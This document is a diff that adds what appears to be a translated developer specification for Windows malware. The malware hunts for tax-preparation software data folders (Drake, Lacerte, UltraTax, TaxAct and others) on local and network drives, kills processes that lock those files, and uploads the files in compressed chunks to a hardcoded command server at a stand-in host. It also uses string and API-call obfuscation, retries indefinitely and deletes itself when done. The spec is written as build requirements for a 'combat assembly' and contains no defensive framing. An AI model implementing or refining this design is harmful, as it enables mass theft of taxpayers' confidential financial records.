@@ -1,0 +1,204 @@
+A SIMPLE MODULE FOR DOWNLOADING FILES FROM A COMPUTER
+TECHNICAL TASK
+
+The purpose of the program is to search and download data from a computer
+
+DESCRIPTION AND DESIGN
+
+The program must be designed as an .exe file that does not accept parameters from the command line.
+
+The program collects program files (names as specified in the Windows registry):
+- 2018 Lacerte Tax
+- Pro Series 2018
+- UltraTax CS 2018
+- TaxWise 2018 on C Drive
+-ATX 2018
+
+The program searches for the following files and folders by exact path matching:
+- DRAKE18/DT
+-UT18DATA
+- 18tax/IData
+(clarification - all folders that end in Data)
+- 18Data
+- UTS18/database + UTS18/Users + UTS18/password.18
+- TaxAct 2018 Professional Edition/Client Data
+Here the coincidence of the hierarchy is important - i.e. you need not just a DT folder, but a DT folder inside the DRAKE18 folder.
+The search is case insensitive.
+The number 18 in the folder names is the number of the year (2018) - it should be varied from 16 to 18.
+
+The search strategy is the following:
+1. We are looking for shortcuts to the following programs on the desktop and in the user's working folders (Documents, Downloads):
+- DRAKE18.EXE
+- DSTART.EXE
+- utw18.exe
+- w18tax.exe
+-protax18.exe
+- TWW17.exe
+- TaxAct18.exe
+- Sfs.ServerHost.exe
+-ATX.exe
+(17, 18 - numbers of years, we vary years from 16 to 18).
+If there are no shortcuts, most likely the necessary data is missing on the computer, because. appropriate programs are not installed.
+We complete the work.
+
+2. Starting from the C: drive, we look on the disk in the first-level folders for the beginning of the hierarchies we need,
+starting with the following folders:
+C:\ProWin18\18data
+C:\ProNet18\18data
+C:\Lacerte\18tax\******Data
+C:\WinCSI\UT18DATA
+C:\DRAKE18\DT
+C:\ProgramData\Wolters Kluwer\ATX 2018 Server
+C:\UTS18
+C:\2018 Lacerte Tax
+C:\ProSeries 2018
+C:\UltraTax CS 2018
+C:\TaxWise 2017
+
+Next, we go through all the first-level folders on the current disk.
+Important: We don't stop searching after finding the first result.
+
+3. We search on each disk, including network ones.
+4. We DO NOT do a full recursive search! The search is limited to the second level of directories - if there are no signs of the desired hierarchy at the second level,
+skip folder.
+5. If, when trying to open a file for reading, we get the error File is busy or similar (indicating a blocking
+file by another process), we look for the process from point 1 in memory and kill it.
+If the error persists, remember the path to the folder and continue the search.
+After the scan of all disks is completed, we cyclically process all non-transferred folders,
+falling asleep for a timeout of 10 minutes after each unsuccessful attempt - and so on ad infinitum.
+6. Files are sent using the protocol for sending files.
+7. Read the PROMPT environment variable.
+This variable will contain an unusual command line prompt for DOS/Windows,
+and program identification data.
+
+We parse the string by the delimiter , (comma) into three parts:
+- Client ID
+- Group ID
+-IP address
+If the string is not parsed (there are more or less fields), or the address does not look like an address, we take the values ​​of these fields as:
+Client ID: %MACHINE%-%USER%_W%winver%.%hex32% (generated according to the scheme indicated below)
+Group ID: nop000
+IP address: 0.0.0.0
+
+The client id is a string consisting of two components separated by a dot.
+The first part has the format %MACHINE%-%USER%_XYYYYYYY, where
+MACHINE - computer name
+USER - username
+X - a symbol indicating the type of system on which the client is running
+(W - windows, L - linux, A - android, M - Mac OS),
+YYYYYYY - 3-7 digits containing the major-version, minor-version and build of the operating system if the systems have them
+(for example, for 6.1 build 7600 it will be 617600).
+The second part contains 32 random characters 0-9, A-F.
+An example client id is HOSTNAME-USER_W617600.11223344556677889900AABBCCDDEEFF.
+The parameter is not case sensitive.
+8. When transmitting data over a network (HTTP protocol), all HTTP codes that do not start with 200 are an error.
+If there is a transmission problem (non-200 code or no response), we retry ten times with a timeout of an hour and die.
+9. The server address is sewn up in the program.
+The program must be able to work both over HTTP and HTTPS - for this you can use the WinInet/WinHTTP functions.
+10. The program should remove itself from the disk when finished.
+
+
+MODULE DESIGN
+1. If the Microsoft compiler is selected, then there must be a Microsoft Visual Studio project with a version of at least 2015.
+2. The Visual Studio project must be configured as follows:
+* For ALL assembly profiles:
+- output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\
+- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\
+- Multiprocessor compilation: yes
+* Release profile:
+- Debug info format (C/C++ code generation): no
+- Generate debug info (linker/debug): no
+3. Obfuscate the strings with the Andrivet library (attached, see _STR() macro)
+4. Obfuscate system calls with the GetApi.h library. Be careful, obfuscation of syscalls can cause crashes.
+5. The module must have two versions - x32- and x64-bit.
+6. In the combat assembly, the lines should be obfuscated to the maximum, all debugging output should be disabled.
+7. The module must have a debug version. Debug output should be displayed in modulename.log (the path to the log is configured in the macro).
+Each log entry must contain a timestamp accurate to the second.
+8. The project must have a settings file config.h (the name is not important, the essence is important - here are all the global settings - paths, conditional compilation switch macros, etc.).
+9. The module should work on all modern versions of Windows.
+   The minimum supported version of Windows is Windows XP (if not possible, Windows Vista).
+10. Additionally, the notelemetry.obj file (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-) must be added to the layout trigger)
+
+
+FILE TRANSFER PROTOCOL
+
+1) basic information about the computer is sent to the server via HTTP POST in a multipart/form-data container (similar to a normal html form submission).
+POST contains the following fields:
+timestamp - local UNIX time
+ip - IP address field
+ip1 - address of the first network interface (in this implementation, fields with local interface addresses are not used; reserved)
+ip2 - address of the second network interface
+...
+ipN - address of N-th network interface
+cid - Client ID field
+group - Group ID field
+hostname - hostname obtained via GetComputerName()
+source - the string `tax'
+
+Sending occurs to the url of the form:
+http://foo.com/<junk>/<auth>/<junk>
+junk - arbitrary characters allowed in the URI, except for the slash /
+auth - authorization section. It is assumed that the one who sends the request,
+must know the rules for the formation of this section.
+This is a random of any length.
+It requires:
+- letter Z in any position
+- the sum of the digits (not numbers!) from the 6th to the 15th position should be 31.
+The symbols between them are random. In particular, there may be Z.
+Section example - abcde7ol7k9hi8mZ
+
+2) then each file is sent in parts, with an HTTP POST request, in a multipart/form-data container.
+The file is transferred to the file field.
+The filename is taken from the Content-Disposition tag; the name of the temporary file from the URI is ignored.
+Wherein:
+- file sending starts from the end. For example, if the file is 100M long, we send the last 10M of the file.
+- after sending a piece of the file and receiving confirmation, the program remembers the state and sends the next piece.
+- before sending, the sent piece of the file is read into memory and compressed by the gzip algorithm.
+- sending is performed to the URL of the form
+http://foo.com/<junk>/<auth>/<cid>/<filename>/<start>/<end>/<eof>
+where
+junk - arbitrary characters allowed in the URI, except for the slash /
+auth - authorization section. This is a random of any length, in which
+- letter S in any position
+- the sum of the digits (not numbers!) from the 8th to the 15th position should be 25.
+cid - Client ID field
+filename - URL encoded file name
+start - initial offset of the transferred piece relative to the beginning of the file; both letters and numbers are allowed here.
+But only numbers are significant, in the order they appear in the string.
+For example, 0A is the number 0 (the digit 0 is significant, the letter A is ignored).
+end - final offset of the transferred piece relative to the beginning of the file; the rules are the same as for start.
+For example, 3A5A2A3A9A5A9A is 3523959.
+eof - sign of the end of the file. If there is a sign, this is the last piece of the file; and vice versa (optional section)
+This is a random of any length, in which the following are required:
+- the first digit is even or 0
+- last letter A or F
+
+When handling errors, the HTTP response code 200 does not indicate the success of the operation,
+but a non-200 code means the operation failed (for example, 50* or 40* from the proxy).
+The exact opcode is contained inside the XML in the HTTP response body, inside the <response> tag.
+When receiving a response code like 4041, the append character 1 is the server's internal error code (enabled only during debugging).
+
+For example, the following response indicates error code 9:
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Mon, 07 Oct 2019 13:08:44 GMT
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary:Accept
+
+<?xml version="1.0" encoding="UTF-8"?>
+<response>4049</response>
+
+The next answer is no error, everything is ok
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Mon, 07 Oct 2019 13:08:44 GMT
+Content-Type: application/xml; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary:Accept
+
+<?xml version="1.0" encoding="UTF-8"?>
+<response>200</response>
